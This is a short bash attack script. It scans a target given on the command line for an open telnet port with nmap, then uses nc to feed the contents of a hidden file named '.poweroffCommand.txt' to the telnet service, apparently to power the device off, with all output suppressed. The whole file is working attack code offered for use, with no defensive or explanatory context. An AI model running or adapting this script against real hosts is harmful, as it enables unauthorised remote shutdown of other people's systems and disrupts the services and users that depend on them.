#!/bin/bash

TARGET=$1

echo "Conducting nmap scan of target"
nmap $TARGET -p 23 -n | grep telnet > /dev/null 2>&1
RC=$?

if [ $RC -eq 0 ]
then
	nc $TARGET 23 < .poweroffCommand.txt > /dev/null 2>&1
	echo "Found"
else
	echo "Telnet not found, aborting..."
fi
